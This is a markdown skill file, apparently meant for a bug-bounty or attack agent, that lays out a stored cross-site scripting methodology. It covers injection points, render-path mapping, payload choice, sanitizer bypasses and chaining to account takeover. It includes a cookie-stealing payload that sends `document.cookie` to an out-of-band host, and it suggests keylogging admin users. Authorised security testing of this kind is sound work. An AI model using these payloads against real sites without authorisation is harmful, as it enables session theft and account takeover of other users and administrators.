---
name: attack-xss-stored
description: "Stored XSS — injection point mining (profile fields, filenames, headers, uploads), render-path verification, second-order XSS, admin-page chaining"
category: "client-side"
version: "1.0"
author: "bountyreper-official"
tags:
  - xss
  - stored
  - second-order
  - render-path
tech_stack:
  - web
cwe_ids:
  - CWE-79
chains_with:
  - attack-xss
  - attack-account-takeover
  - attack-html-injection
prerequisites:
  - attack-xss
---

# Stored XSS

## Objective

Persist a payload server-side and get it to execute in ANOTHER USER'S browser (or an
admin's). The render path — who sees the value, in which page, encoded how — is the
whole bug. Storing junk that only you ever render is not an XSS.

## Methodology

### 1. Mine injection points (where input gets stored, not echoed)

Priority order (highest yield first):
- Profile/display-name fields — render directory pages, admin user lists
- Markdown/rich-text inputs — comments, descriptions, tickets (HTML-in-md apps)
- File upload metadata — **filename** (`<script>` in name, rendered in file lists), EXIF
- HTTP headers with first-order persistence — `User-Agent`, `Referer` → admin traffic logs
- Org/team/workspace names, email display names → rendered on billing/support pages
- Calendar invites, webhooks, invoice notes, support replies
- Interstitial HTML previews: template builders, email/template editors

### 2. Map the render path BEFORE trusting the storage encoding

```text
inject marker  →  record WHERE it renders (page, user role, HTTP context)
                          ↓
walk each: HTML body? attribute? JS var? email HTML? PDF report? *admin panel only*?
```

Second-order trap: input echoes encoded everywhere on phase A, but is decoded inside a
template/page served to admins. The stored value is the vector; the render page is the
proof location.

### 3. Payload choice per audience

- Rendered to end users on the same origin: standard reflected-context payloads apply
- Rendered to admins (bigger impact): prefer payload that exfils or keylogs —
  `fetch('//oob/'+document.cookie)` — but keep first PoC as plain `alert(1)` for the
  triage gate
- Rendered in emails: `onerror` works in most webmail when HTML mail is permitted;
  `<style>`-based exfil has been patched widely — verify before claiming

### 4. Verification ladder (stored-specific)

1. Store → *different browser profile / another user / per-platform preview* → confirm
   execution there. your own session rendering it is not enough.
2. If payload got sanitized on STORE: re-check on RENDER — some paths decode on output.
3. Check every consumer of the field: JSON API consumers, share previews, sitemaps,
   PDF generators, notification digests — pick the least-hardened.
4. For filename/EXIF vectors: verify the list page output context (quoted attr? CDATA?).

### 5. Chain potential

- Admin-rendered stored XSS + admin session = full ATO: pair with attack-account-takeover
- Self-XSS via stored name + login CSRF/contact import = real impact — document the
  delivery chain explicitly or the report dies as self-XSS.

## Notes

- Rate: store-then-check is slow — batch: park N distinct payloads in N fields, inspect
  all render surfaces in one crawl. One marker per field (HTML-safe + attribute-safe).
- Payloads that survive sanitizers: mutation tricks (`<svg><p><style>` DOM mutation),
  mXSS for innerHTML sinks — pair with attack-xss-dom when the render uses inserting JS.
